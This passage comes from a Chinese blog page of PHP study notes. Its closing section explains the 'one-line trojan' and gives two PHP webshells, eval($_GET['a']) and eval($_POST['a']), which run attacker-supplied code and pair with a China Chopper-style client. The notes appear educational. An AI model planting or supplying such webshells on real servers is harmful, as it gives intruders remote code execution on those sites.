+<h4 id="一句话木马"><a href="#一句话木马" class="headerlink" title="一句话木马"></a>一句话木马</h4><p>eval的意思是指将函数体内部的字符当作PHP代码运行<br><figure class="hljs highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-keyword">eval</span>($_GET[<span class="hljs-string">'a'</span>]);<span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure></p>
+<p>c刀代码（Java写的）<br><figure class="hljs highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-keyword">eval</span>($_POST[<span class="hljs-string">'a'</span>]);<span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure></p>
+
+    </main>
+    <footer class="post-footer">
+      
+      <div class="post-tags">
+        
+        <a class="post-tag button" href="/tags/PHP/" rel="tag"><i class="fas fa-tags"></i>PHP</a>
+        
+      </div>
+      
+    </footer>
+  </article>
+  
+  
+<div class="reward" id="reward">
+  <p>您的支持是我前进的动力！</p>
+  <button id="reward-button" class="button" disable="enable">打赏</button>
+  <div id="qr" class="qr" style="display: none;" aria-hidden="true">
+    
+    
+    
+  </div>
+</div>
+
+
+  
+  
+  <nav class="page-nav">
+    <div class="page-nav-next page-nav-item">
+      
+      <a href="/2018/12/15/DB-SQL/" rel="next" title="数据库和SQL"><i class="fas fa-angle-left"></i><span class="nav-title">数据库和SQL</span></a>
+      
+    </div>
+    <div class="page-nav-prev page-nav-item">
+      
+      <a href="/2018/12/18/B-S-frame/" rel="prev" title="B/S架构"><span class="nav-title">B/S架构</span><i class="fas fa-angle-right"></i></a>
+      
+    </div>
+  </nav>
+  
+  
+</div>
+
+          </div>
+          
+          
+          
+<aside class="sidebar" id="sidebar" style="background: url(/images/background.png);">
+  
+  <div class="search">
+    <div class="form-group">
+      <i class="fas fa-search"></i><input type="search" id="search-input" name="q" results="0" placeholder="搜索" class="form-control">
+    </div>
+  </div>
+  <div class="search-result-box" id="search-result"></div>
+  
+  
+<div class="info sidebar-item" id="info">
+  
+  <img class="author-avatar" src="/images/myavatar.jpg" alt="TuringGu">
+  
+  <h1 class="author-name">TuringGu</h1>
+  <h2 class="author-description"></h2>
+  <div class="site-count">
+    
+    <div class="archives-count">
+      <div class="site-count-title">归档</div>
+      <div><a href="/archives/">38</a></div>
+    </div>
+    
+    
+    
+    <span class="site-count-divider divider">|</span>
+    
+    <div class="categories-count">
+      <div class="site-count-title">分类</div>
+      <div><a href="/categories/">0</a></div>
+    </div>
+    
+    
+    
+    <span class="site-count-divider divider">|</span>
+    
+    <div class="tags-count">
+      <div class="site-count-title">标签</div>
+      <div><a href="/tags/">73</a></div>
+    </div>
+    
+  </div>
+  
+  <div class="rss">
+    <a class="rss-link button sidebar-item" href="/atom.xml"><i class="fas fa-rss"></i>RSS</a>
+  </div>
+  
+</div>
+
+
+  <div class="sidebar-sticky">
+    
+    
+    
+    
+    
+    <hr>
+    <div class="post-toc sidebar-item" id="toc-div">
+      <div><i class="fas fa-list-ol"></i>文章目录</div>
+      <div class="post-toc-content"><ol class="list-group toc"><li class="toc-item toc-level-3"><a class="list-group-item toc-link" href="#写在前面"><span class="toc-text">写在前面</span></a></li><li class="toc-item toc-level-3"><a class="list-group-item toc-link" href="#Sublime配置"><span class="toc-text">Sublime配置</span></a></li><li class="toc-item toc-level-3"><a class="list-group-item toc-link" href="#PHP"><span class="toc-text">PHP</span></a><ol class="list-group toc-child"><li class="toc-item toc-level-4"><a class="list-group-item toc-link" href="#定义与概念"><span class="toc-text">定义与概念</span></a></li><li class="toc-item toc-level-4"><a class="list-group-item toc-link" href="#基础规范"><span class="toc-text">基础规范</span></a></li><li class="toc-item toc-level-4"><a class="list-group-item toc-link" href="#数据类型"><span class="toc-text">数据类型</span></a></li><li class="toc-item toc-level-4"><a class="list-group-item toc-link" href="#变量与常量"><span class="toc-text">变量与常量</span></a></li><li class="toc-item toc-level-4"><a class="list-group-item toc-link" href="#输入输出"><span class="toc-text">输入输出</span></a></li><li class="toc-item toc-level-4"><a class="list-group-item toc-link" href="#EOF"><span class="toc-text">EOF</span></a></li><li class="toc-item toc-level-4"><a class="list-group-item toc-link" href="#运算符"><span class="toc-text">运算符</span></a></li><li class="toc-item toc-level-4"><a class="list-group-item toc-link" href="#字符串操作"><span class="toc-text">字符串操作</span></a></li><li class="toc-item toc-level-4"><a class="list-group-item toc-link" href="#类型转换"><span class="toc-text">类型转换</span></a></li><li class="toc-item toc-level-4"><a class="list-group-item toc-link" href="#数组"><span class="toc-text">数组</span></a><ol class="list-group toc-child"><li class="toc-item toc-level-5"><a class="list-group-item toc-link" href="#数组分类"><span class="toc-text">数组分类</span></a></li><li class="toc-item toc-level-5"><a class="list-group-item toc-link" href="#三种赋值方式："><span class="toc-text">三种赋值方式：</span></a></li><li class="toc-item toc-level-5"><a class="list-group-item toc-link" href="#访问关联数组的内容"><span class="toc-text">访问关联数组的内容</span></a></li><li class="toc-item toc-level-5"><a class="list-group-item toc-link" href="#操作技巧"><span class="toc-text">操作技巧</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="list-group-item toc-link" href="#函数"><span class="toc-text">函数</span></a><ol class="list-group toc-child"><li class="toc-item toc-level-5"><a class="list-group-item toc-link" href="#参数"><span class="toc-text">参数</span></a></li><li class="toc-item toc-level-5"><a class="list-group-item toc-link" href="#内置函数"><span class="toc-text">内置函数</span></a></li><li class="toc-item toc-level-5"><a class="list-group-item toc-link" href="#练习"><span class="toc-text">练习</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="list-group-item toc-link" href="#类与对象"><span class="toc-text">类与对象</span></a><ol class="list-group toc-child"><li class="toc-item toc-level-5"><a class="list-group-item toc-link" href="#定义"><span class="toc-text">定义</span></a></li><li class="toc-item toc-level-5"><a class="list-group-item toc-link" href="#对象的主要三个特征"><span class="toc-text">对象的主要三个特征</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="list-group-item toc-link" href="#文件操作"><span class="toc-text">文件操作</span></a><ol class="list-group toc-child"><li class="toc-item toc-level-5"><a class="list-group-item toc-link" href="#文件读取"><span class="toc-text">文件读取</span></a></li><li class="toc-item toc-level-5"><a class="list-group-item toc-link" href="#文件写入"><span class="toc-text">文件写入</span></a></li><li class="toc-item toc-level-5"><a class="list-group-item toc-link" href="#关闭文件"><span class="toc-text">关闭文件</span></a></li><li class="toc-item toc-level-5"><a class="list-group-item toc-link" href="#文件操作函数"><span class="toc-text">文件操作函数</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="list-group-item toc-link" href="#命令执行"><span class="toc-text">命令执行</span></a><ol class="list-group toc-child"><li class="toc-item toc-level-5"><a class="list-group-item toc-link" href="#代码"><span class="toc-text">代码</span></a></li><li class="toc-item toc-level-5"><a class="list-group-item toc-link" href="#执行系统命令"><span class="toc-text">执行系统命令</span></a></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="list-group-item toc-link" href="#补充知识"><span class="toc-text">补充知识</span></a><ol class="list-group toc-child"><li class="toc-item toc-level-4"><a class="list-group-item toc-link" href="#解释性语言与编译型语言"><span class="toc-text">解释性语言与编译型语言</span></a></li><li class="toc-item toc-level-4"><a class="list-group-item toc-link" href="#PHP与JSP"><span class="toc-text">PHP与JSP</span></a></li><li class="toc-item toc-level-4"><a class="list-group-item toc-link" href="#字符转义"><span class="toc-text">字符转义</span></a></li><li class="toc-item toc-level-4"><a class="list-group-item toc-link" href="#PHP中布尔类型特点"><span class="toc-text">PHP中布尔类型特点</span></a></li><li class="toc-item toc-level-4"><a class="list-group-item toc-link" href="#常见网站搭建套路（铁三角）"><span class="toc-text">常见网站搭建套路（铁三角）</span></a></li><li class="toc-item toc-level-4"><a class="list-group-item toc-link" href="#PHP调试错误提示"><span class="toc-text">PHP调试错误提示</span></a></li><li class="toc-item toc-level-4"><a class="list-group-item toc-link" href="#PHP字符占用字节数"><span class="toc-text">PHP字符占用字节数</span></a></li><li class="toc-item toc-level-4"><a class="list-group-item toc-link" href="#常见名词的概念"><span class="toc-text">常见名词的概念</span></a></li><li class="toc-item toc-level-4"><a class="list-group-item toc-link" href="#网络安全中的防御"><span class="toc-text">网络安全中的防御</span></a></li><li class="toc-item toc-level-4"><a class="list-group-item toc-link" href="#一句话木马"><span class="toc-text">一句话木马</span></a></li></ol></li></ol></div>
+    </div>
+    
+    
+    
+    
+    <hr>
+    <div class="blogroll sidebar-item">
+      <div><i class="fas fa-link"></i>友情链接</div>
+      <ul>
+        
+        <li><i class="fas fa-link"></i><a href="https://github.com/TuringGu" target="_blank">GitHub</a></li>
+        
+      </ul>
+    </div>
+    
+  </div>
+</aside>
+
+
+          
+        </div>
+      </div>
+    </main>
+    
+<footer id="footer" class="footer" style="background: #33363b;">
+  <div class="container">
+    <div class="back-to-top">
+      <button id="back-to-top"><i class="fas fa-angle-double-up" aria-label="回到顶部"></i></button>
+    </div>
+    <div class="footer-container">
+      <div class="footer-left">
+        <div class="copyright">
+          <span class="author">TuringGu</span><span class="year"><i class="far fa-copyright"></i>2018 - 2019</span><span class="creative-commons"><i class="fab fa-creative-commons"></i><a href="http://creativecommons.org/licenses/by-nc-nd/4.0/" target="_blank">BY-NC-ND 4.0</a></span>
+        </div>
+        
+        <div class="busuanzi">
+          <span id="busuanzi_container_site_pv"><i class="fas fa-eye" aria-label="站点点击量" aria-hidden="false"></i><span id="busuanzi_value_site_pv"></span></span><span id="busuanzi_container_site_uv"><i class="fas fa-user" aria-label="站点用户数" aria-hidden="false"></i><span id="busuanzi_value_site_uv"></span></span><span id="busuanzi_container_page_pv"><i class="far fa-file-alt"></i><span id="busuanzi_value_page_pv" aria-label="页面点击量" aria-hidden="false"></span></span>
+        </div>
+        
+      </div>
+      <div class="footer-right">
+        <div class="custom-info">
+          
+          托管于<i class="fab fa-github-alt"></i><a href="https://pages.github.com/" target="_blank">GitHub Pages</a>
+          
+        </div>
+        <div class="powered-by">
+          由 <a href="https://hexo.io/" target="_blank">Hexo</a> 强力驱动 | 主题 <a href="https://github.com/AlynxZhou/hexo-theme-aria/" target="_blank">ARIA</a>
+        </div>
+      </div>
+    </div>
+  </div>
+</footer>
+
+
+  </body>
+</html>
